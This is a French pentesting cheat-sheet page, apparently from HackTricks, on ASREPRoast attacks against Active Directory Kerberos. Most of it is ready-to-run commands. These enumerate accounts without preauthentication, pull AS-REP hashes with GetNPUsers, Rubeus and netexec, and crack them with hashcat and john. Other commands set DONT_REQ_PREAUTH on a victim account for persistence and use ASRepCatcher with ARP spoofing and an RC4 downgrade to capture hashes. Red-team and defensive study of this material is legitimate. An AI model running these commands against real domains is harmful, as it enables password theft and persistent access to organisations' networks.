# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast est une attaque de sécurité qui exploite les utilisateurs qui ne possèdent pas l'attribut **Kerberos pre-authentication required attribute**. Essentiellement, cette vulnérabilité permet à un attaquant de demander l'authentification d'un utilisateur auprès du Domain Controller (DC) sans avoir besoin du mot de passe de l'utilisateur. Le DC répond ensuite par un message chiffré avec la clé dérivée du mot de passe de l'utilisateur, que les attaquants peuvent tenter de casser hors ligne pour découvrir le mot de passe de l'utilisateur.

Les principales conditions requises pour cette attaque sont :

- **Lack of Kerberos pre-authentication** : Les utilisateurs cibles ne doivent pas avoir cette fonctionnalité de sécurité activée.
- **Connection to the Domain Controller (DC)** : Les attaquants ont besoin d'accès au DC pour envoyer des requêtes et recevoir des messages chiffrés.
- **Optional domain account** : Disposer d'un domain account permet aux attaquants d'identifier plus efficacement les utilisateurs vulnérables via des requêtes LDAP. Sans un tel compte, les attaquants doivent deviner les noms d'utilisateur.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Demander un message AS_REP
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting with Rubeus générera un 4768 avec un type de chiffrement de 0x17 et preauth type de 0.

#### Commandes rapides (Linux)

- Énumérez d'abord les cibles potentielles (par ex., à partir de leaked build paths) avec Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Récupérez l'AS-REP d'un seul utilisateur même avec un mot de passe **vide** en utilisant `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` (netexec affiche aussi la LDAP signing/channel binding posture).
- Craquez avec `hashcat out.asreproast /path/rockyou.txt` – il détecte automatiquement **-m 18200** (etype 23) pour les AS-REP roast hashes.

### Cracking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistance

Forcer que **preauth** ne soit pas requis pour un utilisateur pour lequel vous avez les permissions **GenericAll** (ou les permissions pour écrire des propriétés) :
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast sans identifiants

Un attaquant peut utiliser une position man-in-the-middle pour capturer des paquets AS-REP lorsqu'ils traversent le réseau sans nécessiter que la pré-authentification Kerberos soit désactivée. Il fonctionne donc pour tous les utilisateurs du VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nous permet de le faire. De plus, l'outil force les postes clients à utiliser RC4 en modifiant la négociation Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Références

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
